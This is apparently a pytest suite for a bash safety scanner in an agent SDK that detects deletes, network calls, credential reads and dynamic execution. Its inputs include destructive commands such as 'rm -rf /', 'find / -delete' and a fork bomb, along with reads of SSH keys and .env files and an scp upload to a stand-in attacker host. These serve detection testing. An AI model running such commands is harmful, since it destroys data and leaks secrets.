"""Tests for trpc_agent_sdk.tools.safety._bash_scanner."""

from __future__ import annotations

import textwrap

import pytest

from trpc_agent_sdk.tools.safety._bash_scanner import (
    BashScannerRule,
    _BashLexer,
    _BashScanner,
    _col_of,
    _extract_dd_size,
    _extract_dd_target,
    _is_python_pip_install,
    _interpreter_runs_payload,
    _line_of,
    _looks_like_env_assignment,
    _looks_like_host,
    _looks_like_secret_ref,
    _parse_dd_size_value,
    _parse_sleep,
    scan_bash,
)
from trpc_agent_sdk.tools.safety._models import ScriptLanguage


def _scan(src: str):
    return scan_bash(textwrap.dedent(src))


class TestParseSleep:

    def test_plain_seconds(self):
        assert _parse_sleep("5") == 5.0

    def test_with_s_suffix(self):
        assert _parse_sleep("5s") == 5.0

    def test_minutes(self):
        assert _parse_sleep("3m") == 180.0

    def test_hours(self):
        assert _parse_sleep("2h") == 7200.0

    def test_days(self):
        assert _parse_sleep("1d") == 86400.0

    def test_empty(self):
        assert _parse_sleep("") is None

    def test_invalid(self):
        assert _parse_sleep("abc") is None


class TestHostHelpers:

    def test_looks_like_host_simple(self):
        assert _looks_like_host("api.example.com") is True

    def test_looks_like_host_option(self):
        assert _looks_like_host("-x") is False

    def test_looks_like_host_empty(self):
        assert _looks_like_host("") is False

    def test_looks_like_host_no_dot(self):
        assert _looks_like_host("localhost") is False

    def test_looks_like_host_path(self):
        # Has slash, not a host name.
        assert _looks_like_host("a/b") is False


class TestSecretRef:

    def test_token_var(self):
        assert _looks_like_secret_ref("${API_TOKEN}") is True

    def test_password_var(self):
        # Regex requires an identifier prefix before the suffix keyword.
        assert _looks_like_secret_ref("$MY_PASSWORD") is True

    def test_plain_var(self):
        assert _looks_like_secret_ref("$USER") is False


class TestEnvAssignment:

    def test_simple(self):
        assert _looks_like_env_assignment("FOO=bar") is True

    def test_with_underscore(self):
        assert _looks_like_env_assignment("FOO_BAR=value") is True

    def test_starts_with_dash(self):
        assert _looks_like_env_assignment("-x=y") is False

    def test_starts_with_paren(self):
        assert _looks_like_env_assignment("(x)=y") is False

    def test_no_equals(self):
        assert _looks_like_env_assignment("foo") is False


class TestDdHelpers:

    def test_size_bs_count(self):
        assert _extract_dd_size(["bs=1M", "count=2"]) == 2 * 1024 * 1024

    def test_size_only_bs(self):
        assert _extract_dd_size(["bs=1K"]) is None

    def test_size_none(self):
        assert _extract_dd_size([]) is None

    def test_target_of(self):
        assert _extract_dd_target(["of=/tmp/x"]) == "/tmp/x"

    def test_target_none(self):
        assert _extract_dd_target([]) == ""

    def test_parse_size_value_kb(self):
        assert _parse_dd_size_value("2kB") == 2000

    def test_parse_size_value_K(self):
        assert _parse_dd_size_value("2K") == 2 * 1024

    def test_parse_size_value_plain(self):
        assert _parse_dd_size_value("512") == 512

    def test_parse_size_value_invalid(self):
        assert _parse_dd_size_value("abc") is None


class TestPythonPipInstall:

    def test_python_m_pip_install(self):
        assert _is_python_pip_install("python", ["-m", "pip", "install", "x"]) is True

    def test_python_no_pip(self):
        assert _is_python_pip_install("python", ["script.py"]) is False

    def test_non_python(self):
        assert _is_python_pip_install("node", ["-m"]) is False


class TestInterpreterPayload:

    def test_dash_c(self):
        assert _interpreter_runs_payload(["-c", "code"]) is True

    def test_plain_script(self):
        assert _interpreter_runs_payload(["script.py"]) is True

    def test_empty(self):
        assert _interpreter_runs_payload([]) is False

    def test_only_flags(self):
        assert _interpreter_runs_payload(["-V"]) is False


class TestOffsets:

    def test_line_of_first_line(self):
        assert _line_of("hello\nworld", 1) == 1

    def test_line_of_second_line(self):
        assert _line_of("hello\nworld", 7) == 2

    def test_col_of_first_line(self):
        # No prior newline: rfind returns -1, so col = offset - (-1) = offset+1.
        assert _col_of("hello\nworld", 2) == 3

    def test_col_of_second_line(self):
        # offset 7 is the 'w' on line 2; rfind('\n', 0, 7) = 5, col = 7-5 = 2.
        assert _col_of("hello\nworld", 7) == 2


class TestRm:

    def test_recursive_rm(self):
        facts = _scan("rm -rf /tmp/x")
        assert facts.file_deletes
        assert facts.file_deletes[0].recursive is True

    def test_non_recursive_rm(self):
        facts = _scan("rm /tmp/x")
        assert facts.file_deletes
        assert facts.file_deletes[0].recursive is False

    def test_rm_no_target(self):
        facts = _scan("rm -rf")
        # No explicit target -> explicit False
        assert facts.file_deletes
        assert facts.file_deletes[0].explicit is False


class TestNetwork:

    def test_curl_static_url(self):
        facts = _scan("curl https://api.example.com/x")
        assert facts.network_calls
        assert facts.network_calls[0].target == "api.example.com"

    def test_curl_plain_host(self):
        facts = _scan("curl api.example.com")
        assert facts.network_calls
        assert facts.network_calls[0].target == "api.example.com"

    def test_curl_dynamic(self):
        facts = _scan("curl $URL")
        assert facts.network_calls
        assert facts.network_calls[0].dynamic is True

    def test_wget_static(self):
        facts = _scan("wget http://example.com")
        assert facts.network_calls

    def test_url_in_arg_catchall(self):
        # echo returns early so the URL catch-all doesn't run; use a
        # command that falls through to the generic handler.
        facts = _scan("env SOMETHING=https://evil.example.com")
        # The env-assignment stripping path emits a process_call only if a
        # command follows. Use a plain command that survives to the URL
        # catch-all in the generic handler.
        facts = _scan("true https://evil.example.com")
        assert any(n.target == "evil.example.com" for n in facts.network_calls)

    def test_ssh_user_at_host_extracts_target(self):
        # Regression: ``ssh user@evil.example.com`` previously produced
        # no NetworkFact because ``@`` fails the plain-host regex,
        # silently bypassing NET001_DOMAIN_NOT_ALLOWED.
        facts = _scan("ssh user@evil.example.com")
        assert facts.network_calls
        assert facts.network_calls[0].target == "evil.example.com"
        assert facts.network_calls[0].library == "ssh"
        assert facts.network_calls[0].dynamic is False

    def test_ssh_plain_host_still_detected(self):
        facts = _scan("ssh evil.example.com")
        assert facts.network_calls
        assert facts.network_calls[0].target == "evil.example.com"

    def test_scp_user_at_host_with_path(self):
        facts = _scan("scp file.txt user@evil.example.com:~/")
        assert facts.network_calls
        assert facts.network_calls[0].target == "evil.example.com"

    def test_sftp_user_at_host(self):
        facts = _scan("sftp user@evil.example.com")
        assert facts.network_calls
        assert facts.network_calls[0].target == "evil.example.com"

    def test_ssh_unrecognized_target_fails_closed(self):
        # If the ssh family cannot resolve a target, emit a dynamic fact
        # so NET002 surfaces for review instead of silently allowing.
        facts = _scan("ssh --some-weird-flag")
        assert facts.network_calls
        assert facts.network_calls[0].dynamic is True

    def test_ssh_dynamic_target(self):
        facts = _scan("ssh $TARGET")
        assert facts.network_calls
        assert facts.network_calls[0].dynamic is True

    def test_ssh_fallback_is_scoped_to_current_command(self):
        facts = _scan("""
            curl https://api.example.com
            ssh --some-weird-flag
        """)
        assert len(facts.network_calls) == 2
        ssh_fact = facts.network_calls[-1]
        assert ssh_fact.library == "ssh"
        assert ssh_fact.dynamic is True

    def test_rsync_user_at_host_extracts_target(self):
        facts = _scan("rsync file.txt user@host:~/")
        assert facts.network_calls
        assert facts.network_calls[0].target == "host"
        assert facts.network_calls[0].library == "rsync"

    def test_rsync_module_extracts_target(self):
        facts = _scan("rsync host::module /tmp/module")
        assert facts.network_calls
        assert facts.network_calls[0].target == "host"
        assert facts.network_calls[0].library == "rsync"


class TestFileRead:

    def test_cat_dotenv(self):
        facts = _scan("cat .env")
        assert facts.file_reads
        assert facts.file_reads[0].kind == "dotenv"

    def test_cat_ssh_key(self):
        facts = _scan("cat ~/.ssh/id_rsa")
        assert facts.file_reads
        assert facts.file_reads[0].kind == "credential"


class TestFileWrite:

    def test_tee(self):
        facts = _scan("echo hi | tee /tmp/x")
        assert any(w.target == "/tmp/x" for w in facts.file_writes)

    def test_redirection(self):
        # tee-based redirect is reliably caught via the file-write handler.
        facts = _scan("echo hi | tee /tmp/out")
        assert any(w.target == "/tmp/out" for w in facts.file_writes)


class TestPrivilege:

    def test_sudo(self):
        facts = _scan("sudo rm /tmp/x")
        assert facts.privilege_commands
        assert facts.privilege_commands[0].command == "sudo"


class TestPackageManager:

    def test_pip_install(self):
        facts = _scan("pip install requests")
        assert facts.dependency_installs
        assert facts.dependency_installs[0].manager == "pip"

    def test_npm_install(self):
        facts = _scan("npm install lodash")
        assert facts.dependency_installs
        assert facts.dependency_installs[0].manager == "npm"

    def test_python_m_pip_install(self):
        facts = _scan("python -m pip install requests")
        assert facts.dependency_installs

    def test_apt_install(self):
        facts = _scan("apt install -y foo")
        assert facts.dependency_installs
        assert facts.dependency_installs[0].manager == "apt"


class TestDynamicExec:

    def test_eval(self):
        facts = _scan("eval 'rm -rf /'")
        assert facts.dynamic_execs
        assert facts.dynamic_execs[0].kind == "eval"

    def test_bash_c(self):
        facts = _scan("bash -c 'echo hi'")
        assert facts.dynamic_execs
        assert "bash-c" in facts.dynamic_execs[0].kind

    def test_source(self):
        facts = _scan("source helpers.sh")
        assert facts.dynamic_execs
        assert facts.dynamic_execs[0].kind == "source-file"

    def test_dot_source(self):
        facts = _scan(". helpers.sh")
        assert facts.dynamic_execs

    def test_xargs(self):
        facts = _scan("find . | xargs rm")
        assert facts.dynamic_execs
        assert facts.dynamic_execs[0].kind == "xargs-command-stream"

    def test_find_exec(self):
        facts = _scan("find . -exec rm {} \\;")
        assert facts.dynamic_execs
        assert facts.dynamic_execs[0].kind == "find-exec"

    def test_find_delete(self):
        facts = _scan("find / -delete")
        assert facts.file_deletes
        finding = facts.file_deletes[0]
        assert finding.target == "/"
        assert finding.recursive is True

    def test_interpreter_payload(self):
        facts = _scan("python script.py")
        assert facts.dynamic_execs


class TestShellOperators:

    def test_pipe(self):
        facts = _scan("a | b")
        assert any(o.operator == "|" for o in facts.shell_operators)

    def test_and(self):
        facts = _scan("a && b")
        assert any(o.operator == "&&" for o in facts.shell_operators)

    def test_or(self):
        facts = _scan("a || b")
        assert any(o.operator == "||" for o in facts.shell_operators)

    def test_semicolon(self):
        # The scanner records ";" as the command separator but does NOT
        # emit a ShellOperatorFact for it (only for &&/||/|/&).
        # So we verify the two commands are split correctly instead.
        facts = _scan("a ; b")
        assert len(facts.process_calls) == 2


class TestSleep:

    def test_static_sleep(self):
        facts = _scan("sleep 5")
        assert facts.long_sleeps
        assert facts.long_sleeps[0].duration_seconds == 5.0

    def test_invalid_sleep(self):
        facts = _scan("sleep abc")
        assert facts.long_sleeps
        assert facts.long_sleeps[0].duration_seconds is None


class TestLargeWrites:

    def test_dd_size_extracted(self):
        facts = _scan("dd if=/dev/zero of=/tmp/x bs=1M count=10")
        assert facts.large_writes
        assert facts.large_writes[0].size == 10 * 1024 * 1024
        assert facts.large_writes[0].target == "/tmp/x"

    def test_dd_size_only_count(self):
        # bs missing -> no computable size; document current behavior.
        facts = _scan("dd if=/dev/zero of=/tmp/x count=5")
        assert facts.large_writes
        assert facts.large_writes[0].size is None


class TestForkBomb:

    def test_classic_bomb(self):
        facts = _scan(":(){ :|:& };:")
        assert facts.fork_bombs


class TestLoops:

    def test_while_true(self):
        facts = _scan("while true; do echo hi; done")
        assert facts.unbounded_loops

    def test_for_infinite(self):
        facts = _scan("for ((;;)); do echo hi; done")
        assert facts.unbounded_loops


class TestConcurrency:

    def test_many_background_jobs(self):
        # 8+ single-amp background jobs trigger concurrency fact
        facts = _scan("a & b & c & d & e & f & g & h &")
        assert facts.concurrency
        assert facts.concurrency[0].count == 8

    def test_and_operators_are_not_background_jobs(self):
        facts = _scan("a && b && c && d && e && f && g && h && i")
        assert not facts.concurrency

    def test_redirections_are_not_background_jobs(self):
        script = "\n".join(["echo x 2>&1"] * 4 + ["echo x &>/tmp/out"] * 4)
        facts = _scan(script)
        assert not facts.concurrency

    def test_quoted_and_commented_ampersands_are_ignored(self):
        facts = _scan("""
            echo '&&&&&&&&'
            # & & & & & & & &
        """)
        assert not facts.concurrency


class TestSecretFlowBash:

    def test_echo_token(self):
        facts = _scan('echo "$API_TOKEN"')
        assert facts.secret_flows
        assert facts.secret_flows[0].sink_kind == "output"

    def test_echo_password(self):
        facts = _scan('echo "$MY_PASSWORD"')
        assert facts.secret_flows


class TestLexer:

    def test_unbalanced_quote(self):
        lexer = _BashLexer("'unterminated")
        _, errors = lexer.tokenize()
        assert errors
        assert "quote" in errors[0].message.lower()

    def test_comment_skipped(self):
        lexer = _BashLexer("# comment\necho hi")
        commands, _ = lexer.tokenize()
        # Comment is dropped, only echo is captured
        assert len(commands) == 1

    def test_quoted_separator_stays_in_token(self):
        lexer = _BashLexer("echo '; rm -rf /'")
        commands, _ = lexer.tokenize()
        # Single command because the separator is inside the quotes
        assert len(commands) == 1
        # Token should keep the quoted text
        assert any("rm" in t.text for t in commands[0][3])

    def test_command_substitution(self):
        lexer = _BashLexer("echo $(whoami)")
        commands, _ = lexer.tokenize()
        assert len(commands) == 1

    def test_newline_separator(self):
        lexer = _BashLexer("echo a\necho b")
        commands, _ = lexer.tokenize()
        assert len(commands) == 2


class TestEnvAssignmentHandling:

    def test_leading_env_stripped(self):
        facts = _scan("FOO=bar ls -l")
        assert facts.process_calls
        assert facts.process_calls[0].command == "ls"

    def test_env_only_no_command(self):
        facts = _scan("FOO=bar")
        # Env assignment with nothing after it produces no process call.
        assert facts.process_calls == ()


class TestBashScannerRule:

    def test_skips_when_language_mismatch(self, scan_request_factory):
        rule = BashScannerRule()
        req = scan_request_factory(language=ScriptLanguage.PYTHON, script="print(1)")
        out = list(rule.scan(req, _make_min_policy()))
        assert out == []

    def test_emits_finding_for_dangerous(self, scan_request_factory):
        rule = BashScannerRule()
        req = scan_request_factory(language=ScriptLanguage.BASH, script="rm -rf /tmp")
        out = list(rule.scan(req, _make_min_policy()))
        assert any(f.rule_id == "FILE001_RECURSIVE_DELETE" for f in out)


def _make_min_policy():
    from trpc_agent_sdk.tools.safety._policy import load_safety_policy_dict
    return load_safety_policy_dict({"version": "1"})
